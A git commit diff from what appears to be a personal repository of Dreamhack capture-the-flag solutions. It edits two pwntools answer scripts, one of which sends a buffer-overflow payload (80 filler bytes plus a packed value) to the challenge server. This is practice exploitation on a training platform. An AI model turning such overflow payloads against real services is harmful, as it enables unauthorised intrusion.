083cf3bd669ce8fbc6ffdeddd482f3541dc7a4d4
Brian Lee <hibrian827@gmail.com>
2025-01-03 01:15:46 +0900

    minor changes

--- Dreamhack/Pwnable/angry_darim/answer.py
+++ Dreamhack/Pwnable/angry_darim/answer.py
@@ -1,4 +1,4 @@
 from pwn import *
 
 print(f"\x5f\x75\x43\x30\x6e\x5f_{int(time.time())}") # actually this is the answer
-rem = process(['./Pwnable/angry_darim/problem/darim', f"\x5f\x75\x43\x30\x6e\x5f_{int(time.time())}"])
+# rem = process(['./Pwnable/angry_darim/problem/darim', f"\x5f\x75\x43\x30\x6e\x5f_{int(time.time())}"])
--- Dreamhack/Pwnable/awesome-basics/answer.py
+++ Dreamhack/Pwnable/awesome-basics/answer.py
@@ -3,12 +3,7 @@ from pwn import *
 port = 15514
 rem = remote("host3.dreamhack.games", port)
 
-context.arch = "amd64"
-
-rop = ROP("./Pwnable/awesome-basics/problem/chall")
-
 payload = b'A' * 80 + p64(1)
-
 rem.sendlineafter(b"Input: ", payload)
 
 print(rem.recvline().rstrip())
